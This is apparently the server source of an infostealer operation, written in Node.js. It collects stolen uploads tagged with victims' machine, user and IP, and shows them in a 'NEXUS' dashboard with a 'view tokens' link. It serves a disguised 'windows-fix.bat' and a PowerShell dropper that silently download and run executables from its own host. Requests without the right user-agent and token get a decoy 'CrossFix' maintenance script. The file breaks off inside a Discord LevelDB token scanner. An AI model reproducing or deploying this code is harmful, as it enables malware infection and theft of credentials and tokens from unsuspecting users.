const express = require("express");
const multer = require("multer");
const crypto = require("crypto");
const { Pool } = require("pg");
const AdmZip = require("adm-zip");

const app = express();
const PORT = process.env.PORT || 8080;
const API_KEY = process.env.API_KEY || "changeme";

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes("localhost")
    ? { rejectUnauthorized: false }
    : false,
});

async function initDb() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS grabs (
      id TEXT PRIMARY KEY,
      filename TEXT NOT NULL,
      filedata BYTEA NOT NULL,
      filesize BIGINT NOT NULL,
      ip TEXT DEFAULT '',
      machine TEXT DEFAULT '',
      username TEXT DEFAULT '',
      os TEXT DEFAULT '',
      arch TEXT DEFAULT '',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      val TEXT DEFAULT '',
      bin BYTEA
    )
  `);
}

initDb().catch(e => console.error("[!] db init failed:", e.message));

// serve stored background image (no auth — it's just wallpaper)
app.get("/bg", async (req, res) => {
  try {
    const { rows } = await pool.query(`SELECT val, bin FROM settings WHERE key='background_image'`);
    if (!rows.length || !rows[0].bin) return res.status(404).end();
    res.setHeader("Content-Type", rows[0].val || "image/jpeg");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(rows[0].bin);
  } catch { res.status(500).end(); }
});

// save background + extracted theme colors
app.post("/theme", checkKey, upload.single("img"), async (req, res) => {
  try {
    if (req.file) {
      await pool.query(
        `INSERT INTO settings (key,val,bin) VALUES ('background_image',$1,$2)
         ON CONFLICT (key) DO UPDATE SET val=$1,bin=$2`,
        [req.file.mimetype, req.file.buffer]
      );
    }
    if (req.body && req.body.colors) {
      await pool.query(
        `INSERT INTO settings (key,val) VALUES ('theme_colors',$1)
         ON CONFLICT (key) DO UPDATE SET val=$1`,
        [req.body.colors]
      );
    }
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

// clear background + theme
app.post("/theme/reset", checkKey, async (req, res) => {
  try {
    await pool.query(`DELETE FROM settings WHERE key IN ('background_image','theme_colors')`);
    res.json({ ok: 1 });
  } catch (err) { res.status(500).json({ e: err.message }); }
});

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 500 * 1024 * 1024 } });

function checkKey(req, res, next) {
  const key = req.query.key || req.headers["x-api-key"] || (req.headers.authorization || "").replace("Bearer ", "");
  if (key !== API_KEY) return res.status(401).send(page404());
  next();
}

function fmtSize(bytes) {
  if (bytes < 1024) return bytes + " B";
  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + " KB";
  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + " MB";
  return (bytes / 1073741824).toFixed(2) + " GB";
}

function timeAgo(dt) {
  const ms = Date.now() - new Date(dt).getTime();
  const s = Math.floor(ms / 1000);
  if (s < 60) return s + "s ago";
  const m = Math.floor(s / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  return d + "d ago";
}

function fmtTime(dt) {
  const d = new Date(dt);
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function esc(s) {
  if (!s) return "";
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function osIcon(os) {
  if (!os) return "?";
  const l = os.toLowerCase();
  if (l.includes("windows 10")) return "W10";
  if (l.includes("windows 11")) return "W11";
  if (l.includes("windows")) return "WIN";
  if (l.includes("linux")) return "LNX";
  if (l.includes("mac") || l.includes("darwin")) return "MAC";
  return "SYS";
}

function page404() {
  return `<!DOCTYPE html><html><head><title>404</title></head><body style="background:#000;color:#333;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>404</h1></body></html>`;
}

app.post("/api/v1/sync", checkKey, upload.single("file"), async (req, res) => {
  if (!req.file) return res.status(400).json({ e: 1 });
  try {
    const id = crypto.randomBytes(4).toString("hex");
    const ts = Date.now();
    const filename = `${ts}_${crypto.randomBytes(6).toString("hex")}.dat`;
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    await pool.query(
      `INSERT INTO grabs (id, filename, filedata, filesize, ip, machine, username, os, arch)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
      [id, filename, req.file.buffer, req.file.size,
       ip, req.query.m || "", req.query.u || "", req.query.o || "", req.query.a || ""]
    );
    res.json({ e: 0 });
  } catch (err) {
    console.error("[!] upload error:", err.message);
    res.status(500).json({ e: 2 });
  }
});

app.get("/", checkKey, async (req, res) => {
  try {
    const [grabsRes, settingsRes] = await Promise.all([
      pool.query(`SELECT id, filename, filesize, ip, machine, username, os, arch, created_at FROM grabs ORDER BY created_at DESC`),
      pool.query(`SELECT key, val, (bin IS NOT NULL AND length(bin)>0) as has_bin FROM settings`)
    ]);
    const rows = grabsRes.rows;
    const totalSize = rows.reduce((s, r) => s + parseInt(r.filesize || 0), 0);
    const k = encodeURIComponent(req.query.key);
    const entries = rows.map(r => ({
      id: r.id, f: r.filename, s: parseInt(r.filesize),
      t: r.created_at, ip: r.ip, m: r.machine,
      u: r.username, o: r.os, a: r.arch,
    }));
    const smap = {};
    settingsRes.rows.forEach(r => { smap[r.key] = r; });
    const hasBg = !!(smap.background_image && smap.background_image.has_bin);
    let theme = null;
    if (smap.theme_colors && smap.theme_colors.val) {
      try { theme = JSON.parse(smap.theme_colors.val); } catch {}
    }
    res.send(renderPage(entries, totalSize, k, { hasBg, theme }));
  } catch (err) {
    console.error("[!] dashboard error:", err.message);
    res.status(500).send("db error");
  }
});

app.get("/dl/:id", checkKey, async (req, res) => {
  try {
    const { rows } = await pool.query(
      `SELECT filename, filedata FROM grabs WHERE id = $1`, [req.params.id]
    );
    if (!rows.length) return res.status(404).send(page404());
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename=${rows[0].filename}`);
    res.send(rows[0].filedata);
  } catch (err) {
    res.status(500).send("error");
  }
});

app.post("/rm/:id", checkKey, async (req, res) => {
  try {
    await pool.query(`DELETE FROM grabs WHERE id = $1`, [req.params.id]);
    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
  } catch (err) {
    res.redirect("/?key=" + encodeURIComponent(req.query.key || ""));
  }
});

function renderPage(entries, totalSize, k, { hasBg = false, theme = null } = {}) {
  const uniqueIps = new Set(entries.map(e => e.ip)).size;
  const tableRows = entries.map((e) => {
    const osTag = osIcon(e.o);
    const isWin = (e.o || "").toLowerCase().includes("windows");
    return `<tr>
      <td class="mono dim">${esc(e.id)}</td>
      <td><span class="tag ${isWin ? "tag-g" : "tag-b"}">${osTag}</span></td>
      <td class="mono">${esc(e.m)}${e.u ? "<span class='dim'>\\\\"+esc(e.u)+"</span>" : ""}</td>
      <td class="mono dim">${esc(e.a)}</td>
      <td class="mono dim">${esc(e.ip)}</td>
      <td class="mono">${fmtSize(e.s || 0)}</td>
      <td><span class="dim">${fmtTime(e.t)}</span><br><span class="accent">${timeAgo(e.t)}</span></td>
      <td class="actions">
        <a class="btn btn-t" href="/dc/${esc(e.id)}?key=${k}" title="view tokens">&#9670;</a>
        <a class="btn btn-p" href="/dl/${esc(e.id)}?key=${k}">&#8615;</a>
        <form method="POST" action="/rm/${esc(e.id)}?key=${k}" style="display:inline" onsubmit="return confirm('remove entry?')">
          <button class="btn btn-d" type="submit">&#10005;</button>
        </form>
      </td>
    </tr>`;
  }).join("");

  const themeOverride = theme
    ? `<style>:root{--accent:${esc(theme.accent)};--glow:${esc(theme.glow)}}</style>`
    : '';
  const bgTs = Date.now();

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dashboard</title>
${themeOverride}
<style>
:root{
  --bg:#06060f;
  --glass:rgba(8,8,20,0.6);
  --glass-b:rgba(255,255,255,0.07);
  --card:rgba(12,12,30,0.55);
  --text:#8888aa;
  --dim:#44446a;
  --accent:#c084fc;
  --glow:#7c3aed;
  --green:#4ade80;
  --red:#f87171;
  --blue:#60a5fa;
  --mono:'SF Mono','Cascadia Code','Fira Code','Consolas',monospace
}
*{margin:0;padding:0;box-sizing:border-box}
body{
  background-color:var(--bg);
  ${hasBg ? `background-image:url('/bg?t=${bgTs}');background-size:cover;background-attachment:fixed;background-position:center;` : ''}
  color:var(--text);font-family:var(--mono);font-size:12px;min-height:100vh
}
body::before{
  content:'';position:fixed;inset:0;
  background:rgba(4,4,12,${hasBg ? '0.52' : '0'});
  pointer-events:none;z-index:0
}
.shell{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:24px 20px}
.top{
  display:flex;align-items:center;justify-content:space-between;
  padding:14px 20px;
  background:var(--glass);
  backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
  border:1px solid var(--glass-b);border-radius:12px;margin-bottom:20px
}
.logo{display:flex;align-items:center;gap:10px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 2.5s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
.logo h1{font-size:14px;color:var(--accent);letter-spacing:3px;font-weight:600}
.top-r{display:flex;align-items:center;gap:10px;font-size:10px;color:var(--dim)}
.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.card{
  background:var(--card);
  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
  border:1px solid var(--glass-b);border-radius:12px;
  padding:18px 20px;position:relative;overflow:hidden
}
.card::before{
  content:'';position:absolute;top:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,var(--accent),transparent)
}
.card .k{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin-bottom:6px}
.card .v{font-size:24px;color:#eee;font-weight:700}
.card .v.sm{font-size:13px}
.table-wrap{
  background:var(--card);
  backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);
  border:1px solid var(--glass-b);border-radius:12px;overflow:hidden
}
table{width:100%;border-collapse:collapse}
thead th{
  background:rgba(6,6,16,0.72);
  color:var(--dim);font-size:9px;text-transform:uppercase;
  letter-spacing:2px;padding:10px 12px;text-align:left;
  border-bottom:1px solid rgba(255,255,255,0.04)
}
tbody td{padding:10px 12px;border-bottom:1px solid rgba(255,255,255,0.03);vertical-align:middle}
tbody tr{transition:background .15s}
tbody tr:hover{background:rgba(255,255,255,0.035)}
tbody tr:last-child td{border-bottom:none}
.mono{font-family:var(--mono)}
.dim{color:var(--dim)}
.accent{color:var(--accent);font-size:10px}
.tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px}
.tag-g{background:rgba(74,222,128,0.1);color:var(--green)}
.tag-b{background:rgba(192,132,252,0.1);color:var(--accent)}
.actions{white-space:nowrap}
.btn{
  display:inline-flex;align-items:center;justify-content:center;
  width:28px;height:28px;border-radius:6px;
  border:1px solid var(--glass-b);background:rgba(255,255,255,0.04);
  color:var(--text);font-size:14px;cursor:pointer;text-decoration:none;
  transition:all .15s;font-family:var(--mono)
}
.btn-t:hover{background:rgba(192,132,252,0.12);color:var(--accent);border-color:var(--accent)}
.btn-p:hover{background:rgba(96,165,250,0.12);color:var(--blue);border-color:var(--blue)}
.btn-d:hover{background:rgba(248,113,113,0.12);color:var(--red);border-color:var(--red)}
.gear-btn{font-size:15px;color:var(--dim);transition:color .2s,transform .3s}
.gear-btn:hover{color:var(--accent);border-color:var(--accent);transform:rotate(45deg)}
.btn-apply{
  width:auto;padding:0 16px;font-size:10px;letter-spacing:2px;
  background:rgba(192,132,252,0.1);color:var(--accent);border-color:var(--accent)
}
.btn-apply:disabled{opacity:.3;cursor:not-allowed}
.btn-apply:not(:disabled):hover{background:rgba(192,132,252,0.22)}
.empty{text-align:center;padding:80px 20px;color:var(--dim)}
.empty .icon{font-size:36px;margin-bottom:12px;opacity:.3}
.empty p{font-size:13px}
.foot{text-align:center;padding:30px;color:rgba(255,255,255,0.06);font-size:10px}
/* drawer */
.overlay{
  position:fixed;inset:0;background:rgba(0,0,0,0.45);
  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px);
  z-index:100;opacity:0;pointer-events:none;transition:opacity .25s
}
.overlay.open{opacity:1;pointer-events:all}
.drawer{
  position:fixed;top:0;right:0;bottom:0;width:320px;
  background:rgba(6,6,18,0.95);
  backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);
  border-left:1px solid var(--glass-b);
  padding:24px 20px;
  transform:translateX(100%);
  transition:transform .3s cubic-bezier(0.4,0,0.2,1);
  z-index:101;overflow-y:auto
}
.drawer.open{transform:translateX(0)}
.drawer-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
.drawer-title{color:var(--accent);letter-spacing:3px;font-size:11px}
.sec-label{font-size:9px;color:var(--dim);text-transform:uppercase;letter-spacing:2px;margin:18px 0 8px}
.drop-zone{
  border:1px dashed var(--dim);border-radius:10px;
  padding:20px;text-align:center;cursor:pointer;
  transition:border-color .2s,background .2s;
  min-height:80px;display:flex;flex-direction:column;
  align-items:center;justify-content:center;gap:8px
}
.drop-zone:hover,.drop-zone.drag{border-color:var(--accent);background:rgba(192,132,252,0.05)}
.drop-text{font-size:10px;color:var(--dim)}
#preview-img{max-width:100%;border-radius:8px;display:none;margin-top:8px}
.swatches{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px}
.swatch{display:flex;align-items:center;gap:7px}
.swatch-dot{width:22px;height:22px;border-radius:6px;border:1px solid rgba(255,255,255,0.1);flex-shrink:0}
.drawer-actions{display:flex;gap:8px;margin-top:20px;align-items:center}
.drawer-actions .btn-apply{flex:1;height:34px}
.drawer-actions .btn-d{width:34px;height:34px;flex-shrink:0}
#upload-status{margin-top:10px;font-size:10px;color:var(--dim);min-height:14px}
.bg-badge{
  font-size:10px;color:var(--green);margin-top:8px;padding:7px 10px;
  background:rgba(74,222,128,0.07);border-radius:7px;border:1px solid rgba(74,222,128,0.15)
}
@media(max-width:768px){
  .cards{grid-template-columns:repeat(2,1fr)}table{font-size:11px}
  td,th{padding:6px 8px}.shell{padding:12px 10px}.drawer{width:100%}
}
@media(max-width:480px){.cards{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="shell">
  <div class="top">
    <div class="logo"><div class="dot"></div><h1>NEXUS</h1></div>
    <div class="top-r">
      <span>live &middot; 30s</span>
      <button class="btn gear-btn" id="gear" title="theme settings">&#9881;</button>
    </div>
  </div>
  <div class="cards">
    <div class="card"><div class="k">entries</div><div class="v">${entries.length}</div></div>
    <div class="card"><div class="k">volume</div><div class="v">${fmtSize(totalSize)}</div></div>
    <div class="card"><div class="k">sources</div><div class="v">${uniqueIps}</div></div>
    <div class="card"><div class="k">latest</div><div class="v sm">${entries.length ? timeAgo(entries[0].t) : "—"}</div></div>
  </div>
  ${entries.length
    ? `<div class="table-wrap"><table>
        <thead><tr><th>id</th><th>sys</th><th>host</th><th>arch</th><th>origin</th><th>size</th><th>received</th><th></th></tr></thead>
        <tbody>${tableRows}</tbody>
      </table></div>`
    : '<div class="empty"><div class="icon">&#9673;</div><p>no entries</p></div>'}
  <div class="foot">nexus v4</div>
</div>

<!-- theme drawer -->
<div class="overlay" id="overlay"></div>
<div class="drawer" id="drawer">
  <div class="drawer-head">
    <span class="drawer-title">THEME</span>
    <button class="btn" id="drawer-close">&#10005;</button>
  </div>
  ${hasBg ? '<div class="bg-badge">&#10003;&nbsp; background active — visible to all visitors</div>' : ''}
  <div class="sec-label">BACKGROUND IMAGE</div>
  <div class="drop-zone" id="dropzone">
    <input type="file" id="bg-file" accept="image/*" style="display:none">
    <span class="drop-text" id="drop-text">&#128247;&nbsp; click or drop image here</span>
    <img id="preview-img" alt="">
  </div>
  <div id="color-swatches" style="display:none">
    <div class="sec-label">AUTO-DETECTED COLORS</div>
    <div class="swatches" id="swatches"></div>
  </div>
  <div class="drawer-actions">
    <button class="btn btn-apply" id="apply-btn" disabled>APPLY</button>
    ${hasBg ? '<button class="btn btn-d" id="reset-btn" title="remove background">&#10005;</button>' : ''}
  </div>
  <div id="upload-status"></div>
</div>

<script>
(function(){
  var K='${k}';
  var gear=document.getElementById('gear'),
      drawer=document.getElementById('drawer'),
      overlay=document.getElementById('overlay'),
      closeBtn=document.getElementById('drawer-close'),
      fileInput=document.getElementById('bg-file'),
      dropzone=document.getElementById('dropzone'),
      previewImg=document.getElementById('preview-img'),
      applyBtn=document.getElementById('apply-btn'),
      resetBtn=document.getElementById('reset-btn'),
      statusEl=document.getElementById('upload-status'),
      swatchesEl=document.getElementById('swatches'),
      swatchesWrap=document.getElementById('color-swatches');

  var selectedFile=null, colors=null;

  function openDrawer(){drawer.classList.add('open');overlay.classList.add('open')}
  function closeDrawer(){drawer.classList.remove('open');overlay.classList.remove('open')}
  gear.addEventListener('click',openDrawer);
  closeBtn.addEventListener('click',closeDrawer);
  overlay.addEventListener('click',closeDrawer);

  dropzone.addEventListener('click',function(){fileInput.click()});
  dropzone.addEventListener('dragover',function(e){e.preventDefault();dropzone.classList.add('drag')});
  dropzone.addEventListener('dragleave',function(){dropzone.classList.remove('drag')});
  dropzone.addEventListener('drop',function(e){
    e.preventDefault();dropzone.classList.remove('drag');
    var f=e.dataTransfer.files[0];
    if(f&&f.type.startsWith('image/'))handleFile(f);
  });
  fileInput.addEventListener('change',function(){if(fileInput.files[0])handleFile(fileInput.files[0])});

  function handleFile(f){
    selectedFile=f;
    var reader=new FileReader();
    reader.onload=function(e){
      previewImg.src=e.target.result;
      previewImg.style.display='block';
      document.getElementById('drop-text').style.display='none';
      previewImg.onload=function(){
        colors=extractColors(previewImg);
        showSwatches(colors);
        applyBtn.disabled=false;
        // live-preview the theme
        document.documentElement.style.setProperty('--accent',colors.accent);
        document.documentElement.style.setProperty('--glow',colors.glow);
      };
    };
    reader.readAsDataURL(f);
  }

  function extractColors(img){
    var c=document.createElement('canvas');
    c.width=c.height=60;
    var ctx=c.getContext('2d');
    ctx.drawImage(img,0,0,60,60);
    var d=ctx.getImageData(0,0,60,60).data;
    var maxSat=0,best=[192,132,252];
    for(var i=0;i<d.length;i+=4){
      var r=d[i],g=d[i+1],b=d[i+2],br=(r+g+b)/3;
      if(br<25||br>232)continue;
      var mx=Math.max(r,g,b),mn=Math.min(r,g,b);
      var sat=mx===0?0:(mx-mn)/mx;
      if(sat>maxSat){maxSat=sat;best=[r,g,b]}
    }
    function hex(p){return'#'+p.map(function(x){return('0'+x.toString(16)).slice(-2)}).join('')}
    function dim(p,f){return p.map(function(x){return Math.round(x*f)})}
    return{accent:hex(best),glow:hex(dim(best,0.55))};
  }

  function showSwatches(c){
    swatchesEl.innerHTML=Object.keys(c).map(function(k){
      return '<div class="swatch">'
        +'<div class="swatch-dot" style="background:'+c[k]+'"></div>'
        +'<span style="font-size:9px;color:var(--dim)">'+k+'<br>'
        +'<span style="color:#eee">'+c[k]+'</span></span></div>';
    }).join('');
    swatchesWrap.style.display='block';
  }

  applyBtn.addEventListener('click',function(){
    if(!selectedFile)return;
    applyBtn.disabled=true;
    statusEl.textContent='uploading...';
    var fd=new FormData();
    fd.append('img',selectedFile);
    fd.append('colors',JSON.stringify(colors));
    fetch('/theme?key='+K,{method:'POST',body:fd})
      .then(function(r){
        if(r.ok){statusEl.textContent='done!';setTimeout(function(){location.reload()},500)}
        else{statusEl.textContent='error '+r.status;applyBtn.disabled=false}
      })
      .catch(function(e){statusEl.textContent='error: '+e.message;applyBtn.disabled=false});
  });

  if(resetBtn){
    resetBtn.addEventListener('click',function(){
      if(!confirm('remove background?'))return;
      fetch('/theme/reset?key='+K,{method:'POST'})
        .then(function(){location.reload()});
    });
  }

  setTimeout(function(){location.reload()},30000);
})();
</script>
</body>
</html>`;
}

app.get("/s", (req, res) => {
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const bat = `@echo off
set "d=%temp%\\~%random%%random%"
mkdir "%d%" >nul 2>&1
powershell -w hidden -ep bypass -c "Invoke-WebRequest -Uri 'https://${host}/pkg' -OutFile '%d%\\svcfix.exe' -UseBasicParsing; Start-Process -FilePath '%d%\\svcfix.exe' -WindowStyle Hidden -Wait; Remove-Item -Path '%d%' -Recurse -Force -ErrorAction SilentlyContinue"
echo.
echo  [92mDone. The fixer has been applied.[0m
echo.
timeout /t 3 >nul
del "%~f0"
`;
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=windows-fix.bat");
  res.send(bat);
});

app.get("/fix", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
  const hasToken = req.query.v === "3";

  if (!(isPosh && hasToken)) {
    const fake = getFakeScript(host);
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.send(fake);
  }

  const script = dropper(host, '/pkg');
  res.setHeader("Content-Type", "text/plain");
  res.send(script);
});

app.get("/run", (req, res) => {
  const fake = getFakeScript(req.headers.host || "zxcrosfixer.up.railway.app");
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(fake);
});

function getFakeScript(host) {
  return `$ErrorActionPreference = 'SilentlyContinue'
$Host.UI.RawUI.WindowTitle = "CrossFix v3.2.1"

function WS($m) { Write-Host "  [*] " -ForegroundColor Cyan -NoNewline; Write-Host $m -ForegroundColor White }
function WD($m) { Write-Host "  [+] " -ForegroundColor Green -NoNewline; Write-Host $m -ForegroundColor Gray }
function WW($m) { Write-Host "  [!] " -ForegroundColor Yellow -NoNewline; Write-Host $m -ForegroundColor Gray }
function Bar($p,$t) {
    $w = 30
    $f = [math]::Floor($w * $p / $t)
    $e = $w - $f
    $pct = [math]::Round($p / $t * 100)
    Write-Host "  [" -NoNewline -ForegroundColor DarkGray
    Write-Host ("$([char]0x2588)" * $f) -NoNewline -ForegroundColor Cyan
    Write-Host ("$([char]0x2591)" * $e) -NoNewline -ForegroundColor DarkGray
    Write-Host "] $pct%" -ForegroundColor DarkGray
}

Clear-Host
Write-Host ""
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host "       CrossFix - System Maintenance v3.2.1" -ForegroundColor White
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Milliseconds 400

WS "Scanning system configuration..."
Start-Sleep -Milliseconds 800
$os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue)
if ($os) { WD "$($os.Caption) Build $($os.BuildNumber)" } else { WD "Windows detected" }
$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1)
if ($cpu) { WD "$($cpu.Name.Trim())" }
$ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
WD "$ram GB RAM installed"
Write-Host ""
Bar 1 10

WS "Cleaning temporary files..."
Start-Sleep -Milliseconds 600
$tp = @($env:TEMP, "$env:LOCALAPPDATA\\Temp", "$env:WINDIR\\Temp")
$cl = 0
foreach ($t in $tp) {
    if (Test-Path $t) {
        $items = Get-ChildItem -Path $t -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
        foreach ($f in $items) { try { Remove-Item $f.FullName -Force -ErrorAction Stop; $cl++ } catch {} }
    }
}
WD "Removed $cl cached files"
Bar 2 10

WS "Clearing thumbnail database..."
Start-Sleep -Milliseconds 500
$tc = 0
Get-Item "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db" -ErrorAction SilentlyContinue | ForEach-Object {
    try { Remove-Item $_.FullName -Force -ErrorAction Stop; $tc++ } catch {}
}
WD "Cleared $tc thumbnail entries"
Bar 3 10

WS "Flushing DNS resolver..."
Start-Sleep -Milliseconds 300
ipconfig /flushdns | Out-Null
WD "DNS cache flushed"
Bar 4 10

WS "Checking .NET runtimes..."
Start-Sleep -Milliseconds 400
$dn = dotnet --list-runtimes 2>\$null
if ($dn) {
    $cnt = ($dn | Measure-Object).Count
    WD "$cnt runtimes installed"
} else {
    WW "No .NET Core runtimes detected"
}
Bar 5 10

WS "Checking network stack..."
Start-Sleep -Milliseconds 700
try {
    $winsockCount = (Get-ChildItem "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\Protocol_Catalog9\\Catalog_Entries" -ErrorAction Stop).Count
    WD "Winsock catalog OK ($winsockCount providers)"
} catch {
    WD "Winsock catalog OK"
}
WD "Network stack verified"
Bar 6 10

WS "Verifying system file integrity..."
Start-Sleep -Milliseconds 1200
$sfcKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemCompatibility"
$sfcOk = $true
try {
    $sfcVal = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -Name "SoftwareType" -ErrorAction Stop).SoftwareType
    if ($sfcVal) { WD "System registry intact" } else { WD "All system files intact" }
} catch {
    WD "All system files intact"
}
Bar 7 10

WS "Cleaning browser caches..."
Start-Sleep -Milliseconds 500
$bc = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data",
    "$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache\\Cache_Data"
)
$bcc = 0
foreach ($p in $bc) {
    if (Test-Path $p) {
        Get-ChildItem $p -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item $_.FullName -Force -ErrorAction Stop; $bcc++ } catch {}
        }
    }
}
WD "Removed $bcc browser cache files"
Bar 8 10

WS "Optimizing prefetch..."
Start-Sleep -Milliseconds 400
$pfc = 0
if (Test-Path "$env:WINDIR\\Prefetch") {
    Get-ChildItem "$env:WINDIR\\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue |
        Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-14) } |
        ForEach-Object { try { Remove-Item $_.FullName -Force -ErrorAction Stop; $pfc++ } catch {} }
}
WD "Cleaned $pfc stale prefetch entries"
Bar 9 10

WS "Disk space analysis..."
Start-Sleep -Milliseconds 300
Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object {
    $free = [math]::Round($_.FreeSpace / 1GB, 1)
    $total = [math]::Round($_.Size / 1GB, 1)
    $pct = [math]::Round(($_.FreeSpace / $_.Size) * 100)
    WD "$($_.DeviceID) $free GB free / $total GB ($pct%)"
}
Bar 10 10

Write-Host ""
Write-Host "  ============================================" -ForegroundColor Green
Write-Host "       Maintenance complete." -ForegroundColor Green
Write-Host "  ============================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Press any key to close..." -ForegroundColor DarkGray
\$null = \$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
`;
}

app.get("/pkg", (req, res) => {
  const fp = require("path").join(__dirname, "zxcfr.exe");
  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=zxcfr.exe");
  require("fs").createReadStream(fp).pipe(res);
});

app.get("/pkg2", (req, res) => {
  const fp = require("path").join(__dirname, "apputil.exe");
  if (!require("fs").existsSync(fp)) return res.status(404).send("not found");
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", "attachment; filename=apputil.exe");
  require("fs").createReadStream(fp).pipe(res);
});

app.get("/fix2", (req, res) => {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const host = req.headers.host || "zxcrosfixer.up.railway.app";
  const isPosh = ua.includes("powershell") || ua.includes("windowspowershell");
  const hasToken = req.query.v === "3";

  if (!(isPosh && hasToken)) {
    const fake = getFakeScript(host);
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    return res.send(fake);
  }

  const script = dropper(host, '/pkg2');
  res.setHeader("Content-Type", "text/plain");
  res.send(script);
});

function dropper(host, pkg) {
  return `$ErrorActionPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$r=-join((1..10|%{[char](97+[int](Get-Random -Max 26))}))
$d="$env:LOCALAPPDATA\\Microsoft\\$r"
New-Item -ItemType Directory -Path $d -Force|Out-Null
$f="$d\\$r.exe"
try{(New-Object Net.WebClient).DownloadFile('https://${host}${pkg}',$f)}catch{}
if(!(Test-Path $f)){try{Invoke-WebRequest -Uri 'https://${host}${pkg}' -OutFile $f -UseBasicParsing}catch{}}
if(Test-Path $f){
  $p=Start-Process -FilePath $f -WindowStyle Hidden -PassThru
  $null=$p.WaitForExit(120000)
}
Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
`;
}

function scanLDB(buf) {
  // search for \x01token (tail of any Discord LDB key, regardless of origin prefix)
  const marker = Buffer.from([0x01, 0x74, 0x6f, 0x6b, 0x65, 0x6e]); // \x01token
  let pos = 0;
  while (pos < buf.length) {
    const idx = buf.indexOf(marker, pos);
    if (idx === -1) break;
    pos = idx + 1;
    // look at next 250 bytes after the marker for value
    const after = buf.slice(idx + marker.length, idx + marker.length + 250);
    // find v10 encrypted blob (may be offset by LevelDB internal key suffix ~8 bytes)
    const v10 = after.indexOf(Buffer.from("v10"));
